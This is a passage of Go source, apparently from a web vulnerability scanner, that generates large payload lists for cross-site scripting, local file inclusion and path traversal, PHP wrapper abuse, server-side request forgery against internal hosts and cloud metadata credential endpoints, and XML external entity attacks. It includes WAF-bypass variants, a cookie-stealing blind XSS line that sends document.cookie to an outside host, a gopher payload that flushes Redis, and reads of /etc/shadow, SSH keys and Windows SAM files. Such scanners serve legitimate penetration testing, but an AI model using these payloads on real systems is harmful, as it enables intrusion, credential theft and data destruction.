		`<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>`,
		`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`,
		`<a href="javasc&#x72;ipt:alert(1)">click</a>`,
		`<a href="javasc&#x0D;ript:alert(1)">click</a>`,
		`<a href="javascript:alert(1)">click</a>`,
	}
	for _, pl := range polyglots {
		n++
		m := padMarker("XSSPG", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s<!-- %s -->", pl, m),
			Check: m, Name: fmt.Sprintf("Polyglot-%d", n),
		})
	}
	for i := 0; i < 30; i++ {
		n++
		m := padMarker("XSSPG", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("jaVasCript:/*-/*`/*\\`/*'/*\"/**/( /* */oNcliCk=alert(%s) )//%%0D%%0A%%0d%%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(%s)//>\\x3e", m, m),
			Check: m, Name: fmt.Sprintf("Polyglot-Gen-%d", i),
		})
	}
	return p
}

func GenXSSDOMBasedPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	sinks := []string{
		"document.write",
		"document.writeln",
		"innerHTML",
		"outerHTML",
		"eval",
		"setTimeout",
		"setInterval",
		"execScript",
		"Function",
		"location",
		"location.href",
		"location.replace",
	}
	for _, sink := range sinks {
		for _, prefix := range []string{"#", "?", "?q=", "#/", "/"} {
			n++
			m := padMarker("XSSDM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s<script>%s('<img src=x onerror=alert(%s)>')</script>", prefix, sink, m),
				Check: m, Name: fmt.Sprintf("DOM-%s-%d", sink, n),
			})
		}
	}
	propPayloads := []string{
		`\";alert(1)//`,
		`'-alert(1)-'`,
		`${alert(1)}`,
		`<script>alert(1)</script>`,
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
		` onfocus=alert(1) autofocus`,
		`" autofocus onfocus="alert(1)`,
		`' autofocus onfocus='alert(1)`,
	}
	for _, pp := range propPayloads {
		for _, ctx := range []string{"", "hash", "search", "pathname"} {
			n++
			m := padMarker("XSSDM", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s <!-- %s --> [%s]", pp, m, ctx),
				Check: m, Name: fmt.Sprintf("DOM-Prop-%s-%d", ctx, n),
			})
		}
	}
	return p
}

func GenXSSWAFBypassPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	bypasses := []struct {
		val string
		chk string
	}{
		{`<svg/onload=alert(1)>`, "alert(1)"},
		{`<svg onload=alert(1)`, "alert(1)"},
		{`<svg onload=alert(1)//`, "alert(1)"},
		{`<svg	onload=alert(1)>`, "alert(1)"},
		{`<svg
onload=alert(1)>`, "alert(1)"},
		{`<svg%0aonload=alert(1)>`, "alert(1)"},
		{`<svg%0daonload=alert(1)>`, "alert(1)"},
		{`<svg%00onload=alert(1)>`, "alert(1)"},
		{`<img src=x onerror=alert(1)>`, "alert(1)"},
		{`<img src=x onerror=alert(1)//
`, "alert(1)"},
		{`<img src=x onerror=alert(1)>`, "alert(1)"},
		{`<img src=x onerror=alert(1)//`, "alert(1)"},
		{`<img src=x onerror="alert(1)">`, "alert(1)"},
		{`<img src=x onerror='alert(1)'>`, "alert(1)"},
		{`<img src="x"onerror=alert(1)>`, "alert(1)"},
		{`<img src=x onerror=alert(1) `, "alert(1)"},
		{`<img src=x%09onerror=alert(1)>`, "alert(1)"},
		{`<img src=x%0aonerror=alert(1)>`, "alert(1)"},
		{`<img src=x%0donerror=alert(1)>`, "alert(1)"},
		{`<img src=x%00onerror=alert(1)>`, "alert(1)"},
		{`<img src="x" onerror=alert(1)">`, "alert(1)"},
		{`<img src=x onerror=\u0061lert(1)>`, "alert(1)"},
		{`<Body OnLoAd=alert(1)>`, "alert(1)"},
		{`<BODY onload=alert(1)>`, "alert(1)"},
		{`<bOdY OnLoAd=alert(1)>`, "alert(1)"},
		{`<input autofocus onfocus=alert(1)>`, "alert(1)"},
		{`<input onfocus=alert(1) autofocus>`, "alert(1)"},
		{`<input onfocus=alert(1) autofocus=true>`, "alert(1)"},
		{`<input onblur=alert(1) autofocus>`, "alert(1)"},
		{`<select autofocus onfocus=alert(1)>`, "alert(1)"},
		{`<textarea autofocus onfocus=alert(1)>`, "alert(1)"},
		{`<keygen autofocus onfocus=alert(1)>`, "alert(1)"},
		{`<details open ontoggle=alert(1)>`, "alert(1)"},
		{`<details open ontoggle=alert(1)//`, "alert(1)"},
		{`<details/open/ontoggle=alert(1)>`, "alert(1)"},
		{`<a href=javascript:alert(1)>x</a>`, "alert(1)"},
		{`<a href="javascript:alert(1)">x</a>`, "alert(1)"},
		{`<a href='javascript:alert(1)'>x</a>`, "alert(1)"},
		{`<a href=javascript:alert(1)>`, "alert(1)"},
		{`<a href=javascript:alert(1)><svg>`, "alert(1)"},
		{`<a href=javascript:alert(1)><img>`, "alert(1)"},
		{`<iframe srcdoc="<script>alert(1)</script>">`, "alert(1)"},
		{`<iframe srcdoc="<img src=x onerror=alert(1)>">`, "alert(1)"},
		{`<iframe src="javascript:alert(1)">`, "alert(1)"},
		{`<object data="javascript:alert(1)">`, "alert(1)"},
		{`<embed src="javascript:alert(1)">`, "alert(1)"},
		{`<script src="data:application/x-javascript;base64,YWxlcnQoMSk=">`, "alert(1)"},
		{`<script src="data:text/javascript,alert(1)">`, "alert(1)"},
		{`<script src="data:;base64,YWxlcnQoMSk=">`, "alert(1)"},
		{`<script src="data:text/javascript;base64,YWxlcnQoMSk=">`, "alert(1)"},
	}
	for _, b := range bypasses {
		n++
		m := padMarker("XSSWF", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s<!-- %s -->", b.val, m),
			Check: m, Name: fmt.Sprintf("WAFBypass-%d", n),
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("XSSWF", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("<script>alert(String.fromCharCode(%d,%d,%d,%d,%d))</script><!-- %s -->", m[0], m[1], m[2], m[3], m[4], m),
			Check: m, Name: fmt.Sprintf("WAF-Charcode-%d", i),
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("XSSWF", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("<script>alert('%s')</script>", m),
			Check: m, Name: fmt.Sprintf("WAF-Simple-%d", i),
		})
	}
	return p
}

func GenXSSFrameworkPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	react := []string{
		`{"__proto__": {"xss": "alert(1)"}}`,
		`<img src="x" onerror={alert(1)} />`,
		`<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />`,
		`<div ref={(e) => alert(1)} />`,
	}
	for _, r := range react {
		n++
		m := padMarker("XSSFW", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", r, m),
			Check: m, Name: fmt.Sprintf("React-XSS-%d", n),
		})
	}
	vue := []string{
		`{{constructor.constructor('alert(1)')()}}`,
		`<div v-html="'<img src=x onerror=alert(1)>'"></div>`,
		`<a :href="'javascript:alert(1)'">x</a>`,
		`<div v-bind="{onload: 'alert(1)'}">`,
		`<input @focus=alert(1)>`,
		`<div v-on:load=alert(1)>`,
	}
	for _, v := range vue {
		n++
		m := padMarker("XSSFW", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", v, m),
			Check: m, Name: fmt.Sprintf("Vue-XSS-%d", n),
		})
	}
	angular := []string{
		`{{constructor.constructor('alert(1)')()}}`,
		`<img ng-src="x" ng-on-error="alert(1)">`,
		`<input ng-focus="alert(1)">`,
		`<div ng-click="alert(1)">x</div>`,
		`<a ng-href="javascript:alert(1)">x</a>`,
		`{{1+constructor.constructor('alert(1)')()}}`,
	}
	for _, a := range angular {
		n++
		m := padMarker("XSSFW", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", a, m),
			Check: m, Name: fmt.Sprintf("Angular-XSS-%d", n),
		})
	}
	jQuery := []string{
		`.html('<img src=x onerror=alert(1)>')`,
		`.append('<img src=x onerror=alert(1)>')`,
		`$('<img src=x onerror=alert(1)>')`,
		`.prepend('<img src=x onerror=alert(1)>')`,
		`.before('<img src=x onerror=alert(1)>')`,
		`.after('<img src=x onerror=alert(1)>')`,
		`.wrap('<img src=x onerror=alert(1)>')`,
		`.wrapAll('<img src=x onerror=alert(1)>')`,
		`.wrapInner('<img src=x onerror=alert(1)>')`,
	}
	for _, j := range jQuery {
		n++
		m := padMarker("XSSFW", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s <!-- %s -->", j, m),
			Check: m, Name: fmt.Sprintf("jQuery-XSS-%d", n),
		})
	}
	return p
}

func GenXSSBlindPayloadsExpanded() []XSSBlindPayload {
	var p []XSSBlindPayload
	n := 0
	blind := []string{
		"<script src=\"https://blind.fang.xyz/track\"></script>",
		"<img src=\"https://blind.fang.xyz/track\">",
		"<link rel=\"stylesheet\" href=\"https://blind.fang.xyz/track\">",
		"<iframe src=\"https://blind.fang.xyz/track\"></iframe>",
		"<img src=\"//blind.fang.xyz/track\">",
		"<script>fetch('https://blind.fang.xyz/track')</script>",
		"<script>new Image().src='https://blind.fang.xyz/track'</script>",
		"<script>var i=document.createElement('img');i.src='https://blind.fang.xyz/track';</script>",
		"<script>navigator.sendBeacon('https://blind.fang.xyz/track')</script>",
		"<script>document.location='https://blind.fang.xyz/track'</script>",
		"<body onload=\"fetch('https://blind.fang.xyz/track')\">",
		"<svg onload=\"fetch('https://blind.fang.xyz/track')\">",
		"<input autofocus onfocus=\"fetch('https://blind.fang.xyz/track')\">",
		"<details open ontoggle=\"fetch('https://blind.fang.xyz/track')\">",
		"<script>new Image().setAttribute('src','https://blind.fang.xyz/track')</script>",
		"<script>fetch('https://blind.fang.xyz/'+document.cookie)</script>",
		"<script>new XMLHttpRequest();x.open('GET','https://blind.fang.xyz/track');x.send();</script>",
	}
	for _, b := range blind {
		n++
		m := padMarker("XSSBL", n)
		p = append(p, XSSBlindPayload{
			Value: fmt.Sprintf("%s<!-- %s -->", b, m),
			Check: m,
		})
	}
	for i := 0; i < 20; i++ {
		n++
		m := padMarker("XSSBL", n)
		p = append(p, XSSBlindPayload{
			Value: fmt.Sprintf("<script src=\"https://blind.fang.xyz/%s\"></script>", m),
			Check: m,
		})
	}
	return p
}

func GenLFIPathTraversalPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	targets := []string{
		"etc/passwd", "etc/hosts", "etc/shadow", "etc/group",
		"etc/issue", "etc/motd", "etc/crontab", "etc/fstab",
		"etc/php.ini", "etc/httpd.conf", "etc/apache2/apache2.conf",
		"etc/nginx/nginx.conf", "proc/self/environ", "proc/version",
		"proc/self/cmdline", "proc/self/status", "proc/self/fd/0",
		"proc/self/fd/1", "proc/self/fd/2", "proc/net/tcp",
		"proc/net/arp", "proc/net/route", "proc/self/mounts",
		"proc/self/cgroup", "proc/1/environ", "root/.ssh/id_rsa",
		"root/.bash_history", "root/.bashrc", "var/log/apache2/access.log",
		"var/log/apache2/error.log", "var/log/nginx/access.log",
		"var/log/nginx/error.log", "var/log/auth.log", "var/log/syslog",
		"var/log/messages", "var/log/mysql.log", "var/log/httpd/access_log",
		"var/log/httpd/error_log", "var/www/html/index.php",
		"var/www/html/config.php", "usr/local/etc/php/php.ini",
	}
	for depth := 1; depth <= 15; depth++ {
		prefix := ""
		for i := 0; i < depth; i++ {
			prefix += "../"
		}
		for _, target := range targets {
			n++
			m := padMarker("LFIPT", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", prefix, target, m),
				Check: m, Name: fmt.Sprintf("PathTrav-%ddepth-%s", depth, target),
			})
		}
	}
	return p
}

func GenLFIPHPWrapperPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	filters := []string{
		"convert.base64-encode",
		"convert.base64-encode/resource=",
		"read=convert.base64-encode/resource=",
		"convert.quoted-printable-encode/resource=",
		"string.rot13/resource=",
		"convert.iconv.utf-8.utf-16/resource=",
		"convert.iconv.utf-8.utf-7/resource=",
		"zlib.deflate/resource=",
		"zlib.inflate/resource=",
	}
	resources := []string{
		"/etc/passwd", "/etc/hosts", "/etc/shadow", "index.php",
		"config.php", "wp-config.php", "../wp-config.php",
		"/var/www/html/config.php", "flag.php", "flag.txt",
		"/proc/self/environ", "/etc/nginx/nginx.conf",
	}
	for _, f := range filters {
		for _, r := range resources {
			n++
			m := padMarker("LFIPHP", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("php://filter/%s%s %s", f, r, m),
				Check: m, Name: fmt.Sprintf("PHPFilter-%s-%s", safeSlice(f, 20), safeSlice(r, 10)),
			})
		}
	}
	wrappers := []struct {
		val string
		chk string
	}{
		{fmt.Sprintf("php://filter/convert.base64-encode/resource=%s", "/etc/passwd"), "cm9vd"},
		{fmt.Sprintf("php://filter/read=convert.base64-encode/resource=%s", "/etc/hosts"), "bG9jYWxob3N0"},
		{fmt.Sprintf("php://filter/read=convert.base64-encode/resource=%s", "index.php"), "PD9waHA"},
		{"expect://id", "uid="},
		{"expect://whoami", ""},
		{"expect://uname -a", "Linux"},
		{"expect://ls -la", ""},
		{"expect://cat /etc/passwd", "root:"},
		{"expect://php -r 'system(\"id\")'", "uid="},
		{"zip:///var/www/html/file.zip#shell.txt", ""},
		{"zip://./file.zip#shell.txt", ""},
		{"phar://./test.phar/shell.txt", ""},
		{"phar://test.phar/shell.txt", ""},
		{"data://text/plain,test", "test"},
		{"data://text/plain;base64,dGVzdA==", "test"},
		{"data://text/html,<script>alert(1)</script>", "alert(1)"},
		{"data://text/plain,<?php echo 'test';?>", "test"},
		{"input://", ""},
	}
	for _, w := range wrappers {
		n++
		m := padMarker("LFIPHP", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", w.val, m),
			Check: m, Name: fmt.Sprintf("Wrapper-%d", n),
		})
	}
	return p
}

func GenLFIWindowsPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	targets := []string{
		"windows\\win.ini", "windows\\system32\\drivers\\etc\\hosts",
		"windows\\repair\\sam", "windows\\repair\\system",
		"windows\\repair\\software", "windows\\php.ini",
		"windows\\system32\\config\\SAM", "windows\\system32\\config\\SYSTEM",
		"windows\\system32\\config\\SECURITY",
		"windows\\system32\\config\\SOFTWARE",
		"windows\\debug\\NetSetup.log", "windows\\iis.log",
		"windows\\system32\\inetsrv\\Metabase.xml",
		"boot.ini", "autoexec.bat", "pagefile.sys",
		"Program Files\\Apache Group\\Apache\\conf\\httpd.conf",
		"Program Files\\mysql\\my.ini",
		"Program Files\\xampp\\apache\\conf\\httpd.conf",
	}
	for depth := 1; depth <= 10; depth++ {
		prefix := ""
		for i := 0; i < depth; i++ {
			prefix += "..\\"
		}
		for _, target := range targets {
			n++
			m := padMarker("LFIWIN", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", prefix, target, m),
				Check: m, Name: fmt.Sprintf("WinTrav-%ddepth-%s", depth, safeSlice(target, 15)),
			})
		}
	}
	altSeps := []string{
		"..%5c..%5c..%5c",
		"..%252f..%252f..%252f",
		"..%c0%af..%c0%af..%c0%af",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f",
		"..%2525%252f..%2525%252f..%2525%252f",
	}
	for _, sep := range altSeps {
		for _, target := range []string{"windows\\win.ini", "boot.ini"} {
			n++
			m := padMarker("LFIWIN", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", sep, target, m),
				Check: m, Name: fmt.Sprintf("WinAltSep-%d", n),
			})
		}
	}
	return p
}

func GenLFIProcSelfPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	procTargets := []string{
		"environ", "cmdline", "status", "fd/0", "fd/1", "fd/2",
		"fd/3", "fd/4", "fd/5", "fd/255", "maps", "smaps",
		"numa_maps", "clear_refs", "cgroup", "io", "limits",
		"loginuid", "mounts", "mountinfo", "net/arp", "net/dev",
		"net/tcp", "net/udp", "net/route", "net/fib_trie",
		"net/wireless", "sched", "schedstat", "sessionid",
		"stack", "syscall", "task/self/status", "wchan",
		"cwd", "root", "exe",
	}
	for _, t := range procTargets {
		for _, prefix := range []string{
			"/proc/self/", "/proc/self/%0a/", "/proc/%24/",
			"/proc/%00/self/", "/proc/",
		} {
			n++
			m := padMarker("LFIPR", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("../../../%s%s %s", prefix, t, m),
				Check: m, Name: fmt.Sprintf("ProcSelf-%s-%s", safeSlice(prefix, 8), t),
			})
		}
	}
	return p
}

func GenLFIEncodingBypassPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	encodings := []string{
		"..%%32%66", "..%%32F", "..%%25%32%66",
		"..%%25%32F", "..%%252f", "..%%252F",
		"..%%c0%ae%%c0%ae%%c0%af", "..%%e0%80%ae%%e0%80%ae%%e0%80%af",
		"..%%f0%80%80%ae%%f0%80%80%ae%%f0%80%80%af",
		"..%2525%2525%2525%2525%2525%252f",
		"..%c0%ae%c0%ae%c0%af", "..%e0%80%ae%e0%80%ae%e0%80%af",
		"..%f0%80%80%ae%f0%80%80%ae%f0%80%80%af",
		"..%25%32%66", "..%25%32F", "..%252f", "..%252F",
		"..%c0%af", "..%ef%bc%8f", "..%%ef%%bc%%8f",
	}
	targets := []string{"etc/passwd", "etc/hosts", "etc/shadow"}
	for _, enc := range encodings {
		for _, target := range targets {
			n++
			m := padMarker("LFIENC", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", enc, target, m),
				Check: m, Name: fmt.Sprintf("EncBypass-%d", n),
			})
		}
	}
	nullByte := []string{
		"%00", "\\x00", "\\\\x00", "%%3000",
		"%2500", "\\0", "\\\\0",
	}
	for _, nb := range nullByte {
		for _, target := range []string{"../../../etc/passwd", "../../../etc/hosts"} {
			n++
			m := padMarker("LFIENC", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", target, nb, m),
				Check: m, Name: fmt.Sprintf("NullByte-%d", n),
			})
		}
	}
	for _, alt := range []string{
		"....//....//....//etc/passwd",
		"....\\\\....\\\\....\\\\windows\\\\win.ini",
		"..;/..;/..;/etc/passwd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
	} {
		n++
		m := padMarker("LFIENC", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", alt, m),
			Check: m, Name: fmt.Sprintf("AltTrav-%d", n),
		})
	}
	return p
}

func GenSSRFInternalIPPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	ports := []string{"80", "443", "8080", "8443", "3306", "5432", "6379", "22", "21", "25", "53", "389", "636", "9200", "27017"}
	ipRanges := []struct {
		base  string
		start int
		end   int
		octet int
	}{
		{"127.0.0.", 1, 10, 0},
		{"10.0.0.", 1, 10, 0},
		{"10.10.0.", 1, 5, 0},
		{"172.16.", 0, 0, 1},
		{"172.17.", 0, 0, 1},
		{"172.18.", 0, 0, 1},
		{"172.19.", 0, 0, 1},
		{"192.168.0.", 1, 10, 0},
		{"192.168.1.", 1, 10, 0},
	}
	for _, r := range ipRanges {
		if r.octet == 0 {
			for i := r.start; i <= r.end; i++ {
				for _, port := range ports[:3] {
					n++
					m := padMarker("SSRFIP", n)
					p = append(p, PayloadDef{
						Value: fmt.Sprintf("http://%s%d:%s %s", r.base, i, port, m),
						Check: m, Name: fmt.Sprintf("IP-%s%d", safeSlice(r.base, 6), i),
					})
					n++
					m = padMarker("SSRFIP", n)
					p = append(p, PayloadDef{
						Value: fmt.Sprintf("https://%s%d:%s %s", r.base, i, port, m),
						Check: m, Name: fmt.Sprintf("IP-HTTPS-%s%d", safeSlice(r.base, 6), i),
					})
				}
			}
		} else {
			for _, port := range ports[:3] {
				n++
				m := padMarker("SSRFIP", n)
				p = append(p, PayloadDef{
					Value: fmt.Sprintf("http://%s0.1:%s %s", r.base, port, m),
					Check: m, Name: fmt.Sprintf("IP-%s0.1", r.base),
				})
			}
		}
	}
	bypass := []string{
		"0.0.0.0", "127.1", "0x7f000001", "2130706433",
		"017700000001", "0x7f.0x0.0x0.0x1", "127.0.0.1.nip.io",
		"127.0.0.1.xip.io", "localhost", "localhost.localdomain",
		"[::1]", "[0:0:0:0:0:0:0:1]", "0:0:0:0:0:0:0:1",
		"::1", "[::ffff:127.0.0.1]", "spoofed.burpcollaborator.net",
	}
	for _, b := range bypass {
		for _, scheme := range []string{"http://", "https://"} {
			n++
			m := padMarker("SSRFIP", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", scheme, b, m),
				Check: m, Name: fmt.Sprintf("IPBypass-%s", b),
			})
		}
	}
	return p
}

func GenSSRFCloudMetadataPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	aws := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
		"http://169.254.169.254/latest/meta-data/public-keys/",
		"http://169.254.169.254/latest/user-data",
		"http://169.254.169.254/latest/dynamic/instance-identity/document",
		"http://169.254.169.254/latest/meta-data/hostname",
		"http://169.254.169.254/latest/meta-data/instance-id",
		"http://169.254.169.254/latest/meta-data/public-ipv4",
		"http://169.254.169.254/latest/meta-data/local-ipv4",
	}
	azure := []string{
		"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
		"http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
		"http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
	}
	gcp := []string{
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
		"http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
		"http://metadata.google.internal/computeMetadata/v1/project/project-id",
		"http://metadata.google.internal/computeMetadata/v1/instance/hostname",
		"http://metadata.google.internal/computeMetadata/v1/instance/id",
		"http://metadata.google.internal/computeMetadata/v1/instance/machine-type",
		"http://metadata.google.internal/computeMetadata/v1/instance/zone",
	}
	do := []string{
		"http://169.254.169.254/metadata/v1.json",
		"http://169.254.169.254/metadata/v1/id",
		"http://169.254.169.254/metadata/v1/region",
	}
	alibaba := []string{
		"http://100.100.100.200/latest/meta-data/",
		"http://100.100.100.200/latest/meta-data/instance-id",
		"http://100.100.100.200/latest/meta-data/region-id",
		"http://100.100.100.200/latest/user-data",
	}
	oracle := []string{
		"http://169.254.169.254/opc/v2/instance/",
		"http://169.254.169.254/opc/v2/instance/metadata/",
	}
	allMeta := append(append(append(append(aws, azure...), gcp...), do...), alibaba...)
	allMeta = append(allMeta, oracle...)
	for _, m := range allMeta {
		n++
		marker := padMarker("SSRFCL", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", m, marker),
			Check: marker, Name: fmt.Sprintf("CloudMeta-%d", n),
		})
	}
	for _, cloud := range [][]string{aws, azure, gcp, do, alibaba, oracle} {
		for _, endpoint := range cloud {
			for _, header := range []string{"Metadata:true", "X-Google-Metadata-Request:true"} {
				n++
				m := padMarker("SSRFCL", n)
				p = append(p, PayloadDef{
					Value: fmt.Sprintf("%s # Header: %s %s", endpoint, header, m),
					Check: m, Name: fmt.Sprintf("CloudMetaHeader-%d", n),
				})
			}
		}
	}
	return p
}

func GenSSRFProtocolPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	fileURLs := []string{
		"file:///etc/passwd", "file:///etc/hosts", "file:///etc/shadow",
		"file:///etc/group", "file:///proc/self/environ",
		"file:///proc/self/cmdline", "file:///proc/self/fd/0",
		"file:///c:/windows/win.ini", "file:///c:/boot.ini",
		"file:///c:/windows/system32/drivers/etc/hosts",
		"file:///c:/windows/repair/sam",
	}
	for _, f := range fileURLs {
		n++
		m := padMarker("SSRFPRO", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", f, m),
			Check: m, Name: fmt.Sprintf("File-%d", n),
		})
	}
	proto := []struct {
		val string
		chk string
	}{
		{"gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a", "FLUSHALL"},
		{"gopher://127.0.0.1:6379/_", "6379"},
		{"gopher://127.0.0.1:3306/_", "3306"},
		{"gopher://127.0.0.1:11211/_", "11211"},
		{"gopher://127.0.0.1:25/_", "25"},
		{"dict://127.0.0.1:6379/info", "6379"},
		{"dict://127.0.0.1:3306/", "3306"},
		{"dict://127.0.0.1:11211/", "11211"},
		{"ftp://anonymous:anonymous@127.0.0.1", "anonymous"},
		{"ftp://127.0.0.1:21/", "21"},
		{"ldap://127.0.0.1:389/", "389"},
		{"ldaps://127.0.0.1:636/", "636"},
		{"tftp://127.0.0.1:69/test", "69"},
	}
	for _, pr := range proto {
		n++
		m := padMarker("SSRFPRO", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", pr.val, m),
			Check: m, Name: fmt.Sprintf("Proto-%d", n),
		})
	}
	return p
}

func GenSSRFBypassPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	ipv6 := []string{
		"[::1]", "[::ffff:127.0.0.1]", "[0:0:0:0:0:0:0:1]",
		"[::ffff:10.0.0.1]", "[::ffff:172.16.0.1]", "[::ffff:192.168.0.1]",
	}
	for _, v6 := range ipv6 {
		for _, scheme := range []string{"http://", "https://"} {
			n++
			m := padMarker("SSRFBP", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", scheme, v6, m),
				Check: m, Name: fmt.Sprintf("IPv6-%d", n),
			})
		}
	}
	decimalIPs := []string{
		"http://2130706433", "http://3232235521", "http://167772161",
		"http://2852039166", "http://2886729728", "http://3758096384",
	}
	for _, dip := range decimalIPs {
		n++
		m := padMarker("SSRFBP", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("%s %s", dip, m),
			Check: m, Name: fmt.Sprintf("DecimalIP-%d", n),
		})
	}
	dnsBypass := []string{
		"spoofed.burpcollaborator.net",
		"burpcollaborator.net",
		"localhost.burpcollaborator.net",
		"127.0.0.1.nip.io",
		"127.0.0.1.xip.io",
		"1.1.1.1.nip.io",
	}
	for _, dns := range dnsBypass {
		for _, scheme := range []string{"http://", "https://"} {
			n++
			m := padMarker("SSRFBP", n)
			p = append(p, PayloadDef{
				Value: fmt.Sprintf("%s%s %s", scheme, dns, m),
				Check: m, Name: fmt.Sprintf("DNSBypass-%d", n),
			})
		}
	}
	redirectBy := []string{
		"http://127.0.0.1", "http://169.254.169.254",
	}
	for _, rd := range redirectBy {
		n++
		m := padMarker("SSRFBP", n)
		p = append(p, PayloadDef{
			Value: fmt.Sprintf("http://evil.fangtest.com/redirect?to=%s %s", rd, m),
			Check: m, Name: fmt.Sprintf("Redirect-%d", n),
		})
	}
	return p
}

func GenXXEClassicExpandedPayloads() []XXEPayload {
	var p []XXEPayload
	n := 0
	files := []string{
		"/etc/passwd", "/etc/hosts", "/etc/shadow", "/etc/group",
		"/etc/issue", "/etc/php.ini", "/etc/nginx/nginx.conf",
		"/etc/apache2/apache2.conf", "/etc/httpd/conf/httpd.conf",
		"/proc/self/environ", "/proc/self/cmdline", "/proc/version",
		"/root/.ssh/id_rsa", "/root/.bash_history",
		"/c:/windows/win.ini", "/c:/boot.ini",
		"/c:/windows/system32/drivers/etc/hosts",
	}
	for _, f := range files {
		n++
		m := padMarker("XXECL", n)
		p = append(p, XXEPayload{
			Payload: fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%s">]><foo>&xxe;</foo><!-- %s -->`, f, m),
			Check:   m,
			Name:    fmt.Sprintf("Classic-%d", n),
		})
	}
	for _, f := range files {
		n++
		m := padMarker("XXECL", n)
		p = append(p, XXEPayload{
			Payload: fmt.Sprintf(`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file://%s">]><root>&test;</root><!-- %s -->`, f, m),
			Check:   m,
			Name:    fmt.Sprintf("ClassicAlt-%d", n),
		})
	}
	encVariants := []string{
		`<?xml version="1.0" encoding="UTF-16"?>`,
		`<?xml version="1.0" encoding="ISO-8859-1"?>`,
		`<?xml version="1.0" encoding="UTF-8"?>`,
	}
	for _, enc := range encVariants {
		for _, f := range []string{"/etc/passwd", "/etc/hosts"} {
			n++
			m := padMarker("XXECL", n)
			p = append(p, XXEPayload{
				Payload: fmt.Sprintf(`%s<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://%s">]><foo>&xxe;</foo><!-- %s -->`, enc, f, m),
				Check:   m,
				Name:    fmt.Sprintf("ClassicEnc-%d", n),
			})
		}
	}
	return p
}

func GenXXEBlindOOBPayloads() []PayloadDef {
	var p []PayloadDef
	n := 0
	protocols := []string{
		"http://attacker.fang.xyz/xxe",
		"https://attacker.fang.xyz/xxe",
		"ftp://attacker.fang.xyz/xxe",
		"gopher://attacker.fang.xyz:80/xxe",
		"dict://attacker.fang.xyz:1337/xxe",
	}
	for _, proto := range protocols {
		n++
		m := padMarker("XXEOOB", n)
		p = append(p, PayloadDef{
